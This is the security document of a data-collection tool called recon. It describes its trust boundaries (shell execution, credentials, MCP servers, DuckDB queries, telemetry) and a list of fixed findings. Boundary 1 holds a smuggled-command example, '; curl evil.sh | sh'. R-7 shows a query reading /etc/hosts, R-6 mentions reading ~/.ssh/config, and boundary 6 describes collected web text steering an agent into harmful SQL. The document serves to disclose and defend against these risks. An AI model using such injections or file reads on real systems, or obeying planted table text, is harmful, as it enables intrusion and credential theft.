# Security — recon

recon collects from heterogeneous sources — HTTP APIs, local CLIs, web pages, MCP servers,
capture logs, files followed as they grow, server-sent events — and normalises the results to
JSONL. Two things make it worth reading before
you run someone else's config: **a recon config runs programs** (shell commands, and the MCP
servers it starts), and recon handles source credentials.

Audience: anyone running `recon survey` against a config they did not write.

**Read the config first, then the plan.** `recon survey <mission> --dry-run` validates the
config and lists every run it would make — the exact substituted shell commands, the URLs,
the MCP calls and each run's declared effects (network, subprocess, filesystem) — without
writing anything. It fetches and executes nothing either, with one exception it names in the
plan's `preflight`: for an `mcp` run it starts the stdio server the config names (and
connects to a remote one) to list its tools. A config with an `mcp` source therefore runs
its `command` at the dry run (boundary 8): read that key before planning someone else's
config. Reviewing a config means reviewing it and that plan.

## Blast radius

A survey may execute arbitrary shell commands, start the MCP servers its config names, make
outbound HTTP requests carrying your credentials, and write files under the mission directory
(`.recon/<mission>/`). A dry run may start those MCP servers too.

## Trust boundaries

### 1. Config file → shell (`cli` collector)

`PopenRunner.run_lines` executes with `shell=True`. The command string is built by
`substitute(entry.run, {"url": ..., "pattern": ...})` — string interpolation with **no
quoting**. Both `entry.run` and `entry.patterns` come from the config; `url` comes from
the referenced source entry.

**A recon config is executable. Reviewing one is reviewing a shell script.** A `pattern`
containing `; curl evil.sh | sh` runs. This is not a defect to be fixed by quoting: the
whole point of `run:` is to invoke a local tool with operator-chosen arguments, and
quoting it would break the feature. It is a boundary to be *known*. `--dry-run` prints
every substituted command, which is the place to read them.

What constrains it:

- The child starts in a session of its own (`start_new_session` on POSIX), so a timeout
  kills the whole tree rather than only the shell — a runaway pipeline cannot outlive the
  run.
- The source's `timeout` bounds the command (default 60s); a command with no source has
  300s.
- Its stdin is empty: a command cannot read recon's own input.

What does **not** constrain it: nothing restricts which binaries run, what they touch, or
where they connect. The child inherits recon's environment, every variable of it. There is
no allowlist. Declared effects are what a collector type says about itself; recon reports
them and does not enforce them.

### 2. Source entries → outbound credentials (`api` collector)

A source entry names an environment variable holding its secret (`auth.env`), read through
an injected `Mapping` that defaults to `os.environ`. It is sent as a header (`auth.header`),
a query parameter (`auth.param`), or both. Two consequences:

- The secret is attached to requests to **whatever URL that source declares**. A config
  that points a credentialed source at an attacker's host exfiltrates the credential. The
  URL and the credential are chosen by the same file. The dry-run plan shows each URL.
- The secret goes only to the origin of the request a collector built. A redirect to
  another host, port or scheme is followed without the source's `auth.header`, as httpx2
  follows one without `Authorization`; an upgrade from http to https on the same host keeps
  it (R-9). A key sent as `auth.param` is part of the URL: a redirect carries it on only
  when the server writes it into the new location.
- TLS certificates are verified against the operating system's trust store (httpx2's
  default, through `truststore`).
- Secrets are never written to the JSONL output and never logged. Request headers are
  never persisted. In captures, response headers are persisted with credential-bearing
  values redacted (R-2), and an `auth.param` value is redacted from the captured URL (R-4).

An unset `auth.env` variable sends the request without credentials; the plan warns about
it before anything is sent.

A collector type is not handed the process environment. Its `env` holds only the
variables the mission declares for it: the `auth.env` names of the catalog sources its
collectors run against, and the variables those sources name through their kind's own
settings (an `mcp` source's `env:NAME` references). A plugin type therefore sees the secrets the config granted its
sources and no others, and reading any other name fails the table with a config error
that says where to declare it, rather than returning nothing (R-5). This scopes what a
collector type is *handed*; it is not a sandbox. A plugin is Python in recon's process and
can import `os`, and a `cli` command's child process inherits recon's whole environment
(boundary 1).

An archive's `meta.yaml` names each variable the mission declares, `set` or `unset`, so a
reader can see which credentials a survey ran with; it never holds a value.

### 3. Remote responses → local files

Collected records are attacker-influenced data by definition. recon writes them as JSONL
values, never as paths or commands. Output filenames come from the collector entry's
`name` in the config, not from response content. Capture bodies are named by their own
sha256, never by anything in the response.

`$markitdown` is the one built-in transform that opens a file, and the path it opens is
a collected value. It reads only under the mission directory and the catalog's `local`
sources (after resolving symlinks and `..`), and it never fetches a URL; either refusal
fails the table with a config error (R-6).

A `web` collector's page, and the file `$markitdown` opens, are converted from their bytes
and nothing else. recon builds markitdown with a named list of converters, audited for
markitdown 0.1.5, and none of them reaches the network or starts a process: plain text,
HTML, ZIP (each entry by the same list), RSS, Wikipedia and Bing result pages (parsed, not
fetched), DOCX, XLSX, XLS, PPTX, images, notebooks, PDF, Outlook messages, EPub and CSV.
Left out are the audio converter, which uploads the recording to Google's speech API
(R-14); the YouTube converter, which asks YouTube for a transcript (R-12); the Azure
Document Intelligence converter, which uploads the document; markitdown's plugins; and
exiftool, which markitdown would run on images and audio. The image and PPTX converters
call a model only when given a client, and recon gives none. A converter a later markitdown
adds is not registered until it has been read and listed. Audio is therefore not converted:
it fails the table, naming the document. Importing markitdown itself starts two local
processes once per recon process, `uname -p` and `file -b <python>`: its Document
Intelligence module imports `azure.identity`, which reads the platform through Python's
`platform` module. Neither reaches the network.

### 4. Capture logs → the capture collector

A capture log (`captures.jsonl`, format `recon.v1.capture`) may be written by tools other
than recon, so the `capture` collector trusts nothing in it that names a file. A line's
`body` must be exactly `raw/<sha256>` relative to the log — no other path, absolute or
relative, is opened — and the bytes must hash to that sha256. A line that fails either
check stops the table with an error naming the file and line.

### 5. Claude Code hook → `recon capture`

`recon capture <mission>` appends whatever `PostToolUse` payload arrives on stdin. The
payload's `tool_response` is stored verbatim and its other fields (`tool_input`,
`session_id`, `cwd`, ...) become the capture's `request`. A captured MCP result can contain
anything the tool saw, including private data, so `.recon/<mission>/captures/` deserves the
same care as the conversation transcript. `tool_input` is stored as the hook gives it,
credentials included: an MCP tool that takes a key as an argument has that key written to
the log. recon cannot tell such an argument from any other, and redacting by guessing at
names would both miss keys and destroy evidence, so nothing in `tool_input` is redacted. The
redaction of credential headers and the source's `auth.param` covers what recon fetches
itself, not what a hook hands it. `recon capture` writes only under an existing
mission's directory; it refuses (exit 4) when the mission does not exist, rather than
creating one from a name it was handed.

### 6. Collected text → SQL (`recon query`)

`recon query` runs the SQL it is given, and the SQL is usually written by an agent that
has just read the tables — text from the open web, an API, a tool's output. A table can
therefore talk its reader into a query, and DuckDB SQL can read files and load extensions
that reach the network.

The connection is confined before any SQL runs: `allowed_directories` is the mission's
`archive/` directory, extension auto-install and auto-load are off, external access is
off (DuckDB does not allow turning it back on), and the configuration is locked. A query
reads its own and earlier archives of the same mission and nothing else; `INSTALL`, `LOAD`
and URLs are refused (R-7). DuckDB lets SQL write wherever it may read, so a query runs only
statements DuckDB's parser types as SELECT; `COPY ... TO`, `ATTACH`, `CREATE`, `EXPORT` and
every other statement are refused before any of the SQL runs (R-10).

Spilling to disk is off: DuckDB adds its spill directory (`.tmp/` under the working
directory) to the directories SQL may read, so with it on a query could read whatever is
there (R-15). A query that needs more memory than DuckDB has fails as a `query` error.

What this does **not** do: anything about the text itself. A `content` column from the web
is untrusted wherever it is read.

### 7. Telemetry → the archive's event log, and an OTLP endpoint

Every survey writes its spans to `telemetry.jsonl` in its archive and hands them to
OpenTelemetry's API, which exports them when an SDK is installed: by the `recon` command
when the `OTEL_*` variables name an endpoint, or by a program that imports recon. The
attributes are chosen so that neither destination receives a secret or a body: no header,
request body or response body is an attribute, and `url.full` has its user information,
the source's `auth.param` value and the signature parameters of the HTTP conventions
(`X-Amz-Signature`, `X-Amz-Credential`, `X-Amz-Security-Token`, `sig`, `X-Goog-Signature`)
replaced by `REDACTED`. A span that failed carries its error's kind and a message in recon's
own words, never the error's text, which can quote a command, a URL or SQL (R-11). A failed
table's error, its command or URL included, stays in the archive's `meta.yaml`, and a URL
in an error message has its user information and `auth.param` value `REDACTED` there too.

What this does **not** do: a secret a mission puts anywhere else in a URL (in a path, or in
a query parameter that is not its source's `auth.param`) is recorded as written, as it is
in the dry-run plan and `meta.yaml`. A `cli` collector's commands are neither attributes
nor span messages. The
endpoint the variables name receives the mission's URLs, table and collector names, and
record counts: point it at a collector you trust with them.

When an SDK is installed (the `OTEL_*` variables, or a program's own setup), each HTTP
request also carries a W3C `traceparent` header naming its span, and `tracestate` and any
baggage the caller's context holds, so the source's server can join recon's trace. It
learns a trace id and a span id, nothing of the mission. With no SDK, no such header is
sent.

### 8. Config → an MCP server (`mcp` collector)

An `mcp` source names its server, and each of its two shapes is a boundary of its own.

**A stdio server is a program the config runs.** `command` and `args` are started as a
child process with your user's rights, at the dry run as at the survey: the same trust as
a `cli` collector's `run:` (boundary 1), and with `npx -y` or `uvx`, a package it downloads
first. It is not given a shell, and not recon's environment: it gets the SDK's short list
(`HOME`, `LOGNAME`, `PATH`, `SHELL`, `TERM`, `USER`) and the variables its `env:` gives,
each written as is or as an `env:NAME` reference the mission declares. Its stderr goes to a
temporary file; the end of it is quoted in a failed table's error, in `meta.yaml`. It is
stopped when the survey (or the dry run) ends, however it ends. It runs in the project
root, not recon's working directory, so a server given `.` reads the same tree wherever
recon is run from.

**A remote server receives its own credential only.** Its `token` (`env:NAME` or
`file:PATH`, never the secret itself, which the plan refuses) is sent as `Authorization:
Bearer`, or its `headers_helper` command's headers are sent (a command, so boundary 1's
trust again). They go to the server's `url` and nowhere else: the MCP SDK's client follows
no redirect itself, and its transport follows one only within the server's origin (scheme,
host and port, or http to https on the same host), so a token never leaves its origin, as
the rule (R-9) asks of an HTTP source (R-13): a credentialed source follows no cross-origin redirect. TLS is verified against the operating
system's trust store. A server that signs in with OAuth through a browser is not a source:
reach it through the hook route (boundary 5).

**A server's schema is checked, never followed.** A tool's input schema is the server's
text. recon checks it is valid JSON Schema before checking arguments against it, and
resolves its `$ref`s within the schema alone: a `$ref` to another host is never fetched
(jsonschema's default would fetch it itself, outside the requester). A schema that is not
valid, or refers to what it does not hold, is a requirement that does not hold: the dry
run lists it and the survey fails that table as `config`.

**What a server returns may be private.** A tool reads what its server can reach (a
repository, a mailbox, a drive), and its answer becomes the table, and with `preserve_raw`
the capture: an archive of an `mcp` mission deserves the care its server's data does. In a
capture, every credential value the source resolved (its token, its helper's headers, the
variables given to a stdio server, each cookie's value) is replaced by the redaction marker,
in the result and in the request recorded beside it. The replacing is done on the decoded
result, before it is written as JSON, by one rule with a threshold of 8 characters:

- **8 characters or more: wherever it appears**, inside other text too: at the start of a
  line, after a tab, in a URL, run into other letters (`key-<token>`, `prefix_<token>`, a
  CJK word), in the structured content and in the JSON a text block holds.
- **Under 8 characters: only where it is a whole value**: a whole JSON string, a header's
  whole value, or a whole query parameter's value in a string that is a URL. Never inside a
  number, a boolean or longer text.

Why the threshold. A real token is long, and a server that echoes one puts it where it likes,
so a long credential is replaced as a substring: text that holds it holds the token, and a
narrower test of where it stands lets one through (in written JSON a newline is the two
characters `\n`, so a token at the start of a line looks joined to an `n`). A short value
in a credential-named slot is as often a word or a number of its own: a cookie's
`consent=true`, a stdio server's `DEBUG=1`, `X-Api-Key-Version: 2`. Replaced in text, it
blanks every `true`, `1` or `2` in the capture, a JSON boolean or number included, and the
capture is no longer JSON and cannot be read back by a `capture` collector. So a short one
is replaced only where it is the whole value, and the capture stays JSON of the same shape.
The cost, named: a credential under 8 characters inside longer text stays in the capture,
and so does one inside the JSON of a tool's text block, which is one longer string (its
structured content, when the tool declares an output schema, has it replaced). It is
documented, not redacted (owner ruling 2026-10-22: accepted). A credential that short is
weak whatever recon does; keep a real one long. A credential the tool returns
of its own is in the table as returned.

**Telemetry.** Each call is a `recon.mcp.call` span with the method, the tool's name and
the source, never its arguments or its result. FastMCP's own spans are not made for recon's
calls: a failed one carries the tool's error text as its status. The MCP SDK's spans (a
method name and a request id) nest under recon's when an SDK is installed; a JSON-RPC error
the server sends can be their status message.

### 9. A cursor → the archive store (`recon watch`, `recon.read_since`)

A read of an archive being written takes back the `cursor` an earlier read gave, so the
cursor is input from the caller, and may be anything. It is base64url JSON that only the
archive store reads: one that does not decode, names another archive, holds an offset that
is not a non-negative integer, or reaches past the end of a sealed table is refused as a `usage`
error, and the read returns nothing. A table the cursor names is only compared with the tables
the store finds in the archive, never made into a path, so a cursor cannot make recon read
a file outside the archive. Reading opens files read-only, and takes the writer's lock
only to test it, so a reader changes no byte of the archive.

What this does **not** do: anything about the records themselves, which are the same
untrusted text as a query's (boundary 6).

A stream's cursor (`--stream`) wraps the store's: hex-encoded JSON naming the stream and a
window. One that does not decode, names another stream, or names a window the stream does
not have is refused as a `usage` error (or `not_found`); the window it names is only matched
against the stream's windows as listed, never made into a path.

### 10. A stream's source → its windows (`tail`, `sse`, `recon stream`)

A stream runs for as long as it is told to, so what it reaches, it reaches for that long.

- **`tail` reads any file the config names** that the user running recon can read: a
  relative `url` is the project root's, an absolute one is anywhere. As with a `local`
  source, the config decides, and the plan shows the path (`path`) before anything runs.
  A line longer than the source's `max_bytes` fails the stream rather than being held in
  memory.
- **`sse` is an `api` source's request, held open**: the same credential rule (the
  source's `auth`, to its origin only, a redirect elsewhere followed without it), the same
  rate limit (a token per connection), and a connect or a silence longer than the source's
  `timeout` ends the connection. A reconnect sends the last event id it got, which is the
  server's own value. The body is read a line at a time, each line and each event's data
  bounded by `max_record_bytes`: a longer line is let go to its newline as it arrives, and
  its event, like a larger one, dropped and counted, never held.
- **Memory is bounded by the config**: at most `buffer.bytes` + `buffer.max_record_bytes`
  of records wait between the source and the window being written; a record over
  `max_record_bytes` is dropped and counted, never buffered. A source that sends faster than
  the windows are written either waits (`block`) or has records dropped, each drop counted
  (`stream_overflow`).
- **`retain:` deletes data**: a rule removes the oldest sealed windows, leaving a tombstone
  for each. It is opt-in (the default, `all`, removes nothing, and the plan says so), it
  never removes the newest window or one that was never sealed, and it removes only
  directories in the stream's own directory, by the names the store listed.
- **One writer a stream**: a second `recon stream` of the same stream is refused
  (`busy`) by an `flock` held for the run, so two processes never write one window id.

## Findings

### R-1 — generator cleanup silenced to satisfy the type checker (fixed 2026-08-17)

The writer of a table (then `_sink`, now `ArchiveFiles.write_table`) wraps its record
stream in `contextlib.closing(records)`. During the strict-typing
pass the wrapper was removed because the parameter was typed `Iterable`, which
`closing()` rejects.

That wrapper is load-bearing, not decoration. `_sink` consumes a generator that may hold
an open subprocess pipe or HTTP connection; if the consumer raises partway, `closing()` is
what runs the generator's `finally` and releases it. Without it a failed collect leaks a
file descriptor and can leave a child process running.

Fixed by typing the parameter `Generator[dict[str, Any], None, None]` — the type it
actually is — so `closing()` type-checks and stays.

**Note on the regression test:** the first test written for this passed *with the bug
present* and was worthless. The discriminating case is a **suspended** generator (one with
a live `finally`) plus a **consumer that raises** — only that combination distinguishes
"cleanup happened" from "the generator was exhausted anyway".

### R-2 — raw capture persisted `Set-Cookie` verbatim (fixed 2026-08-18)

With `preserve_raw: true`, the raw capture wrote every response header to disk
unfiltered. A server that issued a session cookie put a **live credential** into a file
whose whole purpose is to be kept, committed, and shared — the audit artefact was the leak.

Fixed: `redact_headers` replaces the values of a named set (`set-cookie`, `authorization`,
`x-api-key`, …), matched case-insensitively. The **key is preserved** so the capture still
proves the server set a cookie; only the value is gone. Dropping the header outright would
have destroyed the evidence the file exists to hold. Since 0.9.0 the redaction applies to
every line of the capture log (`captures.jsonl`).

Regression: `recon/tests/test_capture_log.py`.

### R-3 — CLI capture records the substituted command (open, by design)

A `cli` capture records the fully-substituted commands in its `request`. That is the point
— it is what makes a CLI capture reproducible. But a config that inlines a secret
(`run: curl -H 'Authorization: Bearer sk-...'`) puts that secret on disk.

Not fixed, and not fixable by redaction without guessing at shell syntax and breaking
reproducibility. **Keep credentials in environment variables referenced by a source's
`auth.env`, never inline in a `run:` string.** If you must inline one, treat the archive
as secret material.

### R-4 — `auth.param` would have put the key in the captured URL (prevented, 0.9.0)

`auth.param` sends the credential in the query string, and the response URL — which a
capture records — carries the query string. Implementing `auth.param` without care would
have written the key into every capture. The `api` collector replaces that parameter's
value in the captured URL with the redaction marker before recording it.

Regression: `test_param_key_never_reaches_the_capture_log` in
`recon/tests/test_api_collector.py`.

### R-5 — every collector type was handed the whole environment (fixed)

The composition root passed `os.environ` to every collector type's factory, so installing
a third-party collector type gave it every credential on the machine, whatever the
mission's config named. Fixed by handing each type a mapping scoped to the `auth.env`
names of the sources its collectors use (boundary 2). An undeclared read raises, because
a silent "not set" would send the request without its key.

Regression: `recon/tests/test_composition.py`, and
`test_a_plugin_reading_an_undeclared_variable_fails_its_table_with_a_fix` in
`recon/tests/test_cli.py`.

### R-6 — `$markitdown` fetched URLs and read any path a record named (fixed)

The transform passed the record's value to markitdown's `convert`, which fetches `http:`
and `https:` URLs and opens `file:` URIs and any local path. A record is whatever a
source returned, so a response could make a survey request an arbitrary URL — outside the
requester, the rate limit and the capture log, with no network effect in the plan — or
copy `~/.ssh/config` into a table.

Fixed: URIs are refused, and a path must resolve under the mission directory or a `local`
catalog source. Both are config errors with a fix, not an empty column.

Regression: `recon/tests/test_transforms.py`, and the `test_markitdown_*` tests in
`recon/tests/test_composition.py` (one serves a page from localhost and asserts no
request arrives).

### R-7 — `recon query` could read any file and load extensions (fixed)

`recon query m "SELECT * FROM read_text('/etc/hosts')"` returned the file, and nothing
stopped a query from installing `httpfs` and fetching a URL. Fixed by confining the
connection as boundary 6 describes; the settings and their order were checked against
DuckDB 1.5.5.

Regression: `recon/tests/test_query.py`, and
`test_reading_outside_the_archive_is_refused_with_a_fix` in `recon/tests/test_cli.py`.

### R-8 — telemetry could carry the credential a URL holds (prevented, 0.11.0)

An HTTP span's `url.full` is the URL as sent, and an `auth.param` source sends its key in
the query string. Prevented before release by redacting that parameter, user information
and the conventions' signature parameters, and by recording only the first line of an
error.

Regression: `test_a_request_is_a_client_span_with_the_required_attributes` and
`test_a_transport_failure_names_its_exception_and_credentials_in_the_url_are_redacted` in
`recon/tests/test_telemetry.py`.

### R-9 — a source's own auth header followed a redirect to another host (fixed)

httpx2 drops `Authorization` when a redirect leaves the origin, and nothing else. A source
whose key goes in its own header (`x-api-key`, as Exa, Serper and Semantic Scholar take
it) sent that key to whatever host its API redirected to. Fixed by dropping the source's
`auth.header` from every request sent outside the origin of the one the collector built,
by the rule httpx2 applies to `Authorization`. The redirect is still followed rather than
refused: an API that sends a download to a storage or CDN host with a signed URL needs no
key there, and refusing would fail that table for no gain.

Regression: `test_a_redirect_to_another_origin_does_not_carry_the_sources_credential` and
`test_a_redirect_within_the_origin_keeps_the_credential` in
`recon/tests/test_http_requester.py`.

### R-10 — a query could write into the mission's archives (fixed)

The confinement of R-7 lets SQL write wherever it may read, so `COPY (...) TO`, `ATTACH`
and `EXPORT` wrote files under `archive/`: over an archive's `meta.yaml`, or a planted
`.jsonl` that the next query read as a table. Fixed by running only statements DuckDB's
parser types as SELECT; any other is a `query` error that names it, and nothing in the SQL
runs.

Regression: `TestOnlyReads` in `recon/tests/test_query.py`, and
`test_no_query_the_skill_teaches_is_refused_as_a_write` in `recon/tests/test_skill.py`.

### R-11 — a failed span exported a command and a URL's credentials (fixed)

R-8 kept a failed span's message to the first line of its error, and that line could be
the whole problem: a failed `cli` command's error begins with the command, and a failed
request's with its URL, user information included. Both reached the OTLP endpoint as the
span's status, and the event log, so a secret inlined in `run:` (R-3) left the machine
when its command failed. Fixed: a failed span's message describes the failure in recon's
own words (the table failed, and its kind; the status code; the exception class) and
quotes nothing; the error's text stays in `meta.yaml`. A URL in an error message is
reported as `url.full` is, with user information and `auth.param` `REDACTED`.

Regression: `test_a_failure_exports_no_command_and_no_credential_in_a_url` in
`recon/tests/test_telemetry.py`, which runs `recon survey` with an OTLP receiver.

### R-12 — a YouTube page made markitdown fetch outside the requester (fixed)

Given a YouTube watch URL, markitdown's YouTube converter asked YouTube for the video's
transcript itself: a request outside the requester, its rate limit, `max_bytes`, spans and
the capture log, the class of bypass R-6 closed for `$markitdown`. Its failures were printed
on stdout, where `--json` writes the document. Fixed: the converter is given the page's
bytes and content type, and markitdown is built without its YouTube converter (boundary 3
lists what it is built with), so the page converts as the HTML it is. Its transcript is not
collected.

Regression: `test_a_youtube_page_is_converted_from_its_bytes_and_nothing_more_is_fetched` in
`recon/tests/test_transforms.py`.

### R-13 — an MCP server's credential could follow a redirect, or its error leave by OTLP (prevented)

FastMCP passes `follow_redirects=True` to a client factory, and httpx2 drops only
`Authorization` across origins, so a `headers_helper` key would have followed a redirect to
another host; and FastMCP sets a failed tool call's span status to the tool's error text.
Prevented before release: the collector's client is the SDK's own, which follows no
redirect itself (the SDK's transport follows one only within the origin), and FastMCP's
spans are suppressed for recon's calls.

Regression: `test_a_remotes_token_never_follows_a_redirect_off_its_origin`,
`test_the_sdks_client_follows_no_redirect_itself` and
`test_fastmcps_own_spans_which_carry_a_tools_error_text_are_not_made` in
`recon/tests/test_mcp_collector.py`.

### R-14 — audio was uploaded to Google's speech API (fixed)

markitdown's audio converter transcribes a recording with `speech_recognition`'s
`recognize_google`, which uploads the whole recording to Google. A `web` collector that
fetched `audio/*`, and `$markitdown` on a local `.wav` or `.mp3` (or one inside a ZIP), sent
it there: no requester, rate limit, span or capture, to a third party the mission never
named. R-12 had closed the YouTube converter alone. Fixed: recon no longer builds markitdown
with every built-in; it registers a named list of converters, audited for what they reach
(boundary 3), and audio is not among them.

Regression: `TestAudioIsNeverSentAnywhere` in `recon/tests/test_transforms.py`, which fakes
the speech client and fails if it is called, and
`test_markitdown_holds_only_the_converters_recon_audited`, which holds the list to the audit.

### R-15 — a query could read DuckDB's spill directory (fixed)

DuckDB adds its temp directory to `allowed_directories`, so with the default (`.tmp/`
under the working directory) `SELECT content FROM read_text('.tmp/note.txt')` returned a
file outside the archive, against boundary 6's "nothing else". Fixed: the connection sets
`temp_directory` to empty before it is confined, so nothing spills and the archive is all
a query can read.

Regression: `test_duckdb_s_spill_directory_is_not_readable` in `recon/tests/test_query.py`.

## Not covered

- No sandboxing of collector commands or of the MCP servers a config starts. See
  boundaries 1 and 8.
- No egress allowlist. A source may point anywhere.
- No TLS pinning; recon uses the platform trust store.
- Declared collector effects are not enforced.

## Reporting

Open an issue on the gnx repository, https://github.com/mox-labs/gnx/issues. There is no
separate embargo channel.
